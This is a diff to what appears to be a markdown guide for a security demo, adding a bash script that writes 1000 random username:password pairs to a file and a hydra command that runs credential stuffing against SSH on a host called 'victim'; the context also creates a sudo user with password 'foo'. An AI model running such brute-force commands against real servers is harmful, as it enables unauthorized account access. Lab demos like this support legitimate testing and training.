@@ -239,7 +239,25 @@ echo "foo:foo" | sudo chpasswd
 sudo usermod -aG sudo foo
 ```
 
----
+### generate cred_stuffing.txt
+
+```
+#!/bin/bash
+
+OUTFILE="cred_stuffing.txt"
+> "$OUTFILE"   # clear file
+
+for i in $(seq 1 1000); do
+  USER="user_$(tr -dc a-z0-9 </dev/urandom | head -c6)"
+  PASS="$(tr -dc A-Za-z0-9 </dev/urandom | head -c12)"
+  echo "${USER}:${PASS}" >> "$OUTFILE"
+done
+
+echo "Generated 1000 credentials in $OUTFILE"---
+```
+```
+hydra -C cred_stuffing.txt ssh://"victim"
+```
 
 ## Happy Demo!
 
